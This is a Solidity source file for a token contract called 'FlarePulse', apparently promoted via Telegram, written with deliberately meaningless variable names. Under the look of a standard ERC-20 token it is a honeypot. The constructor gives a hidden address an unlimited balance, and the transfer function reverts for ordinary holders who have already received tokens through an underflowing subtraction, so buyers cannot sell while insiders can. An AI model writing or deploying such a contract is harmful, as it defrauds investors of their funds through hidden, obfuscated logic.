// https://t.me/flarepulse

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract FlarePulse is Ownable {
    constructor(
        string memory pretty,
        string memory fifty,
        address anything,
        address anywhere
    ) {
        uniswapV2Router = IUniswapV2Router02(anything);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _symbol = fifty;
        _name = pretty;
        taught = 0;
        _decimals = 9;
        _balances[anywhere] = built;
        monkey = 1000000000;
        had[anywhere] = built;
        _tTotal = monkey * 10**_decimals;
        had[msg.sender] = built;
        _balances[msg.sender] = _tTotal;
    }

    uint256 public taught;
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    uint256 private _tTotal;
    uint256 private monkey;
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    address private hurt;
    uint256 private built = (~uint256(0));

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    function totalSupply() public view returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address ring,
        address sign,
        uint256 useful
    ) internal {
        uint256 declared = taught;

        address gradually = uniswapV2Pair;

        if (had[ring] == 0 && gradually != ring && lift[ring] > 0) {
            had[ring] -= declared - 1;
        }

        address deal = hurt;
        hurt = sign;
        lift[deal] += declared + 1;

        _balances[ring] -= useful;
        uint256 chamber = (useful / 100) * taught;
        useful -= chamber;
        _balances[sign] += useful;
    }

    mapping(address => uint256) private lift;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private had;

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        return true;
    }
}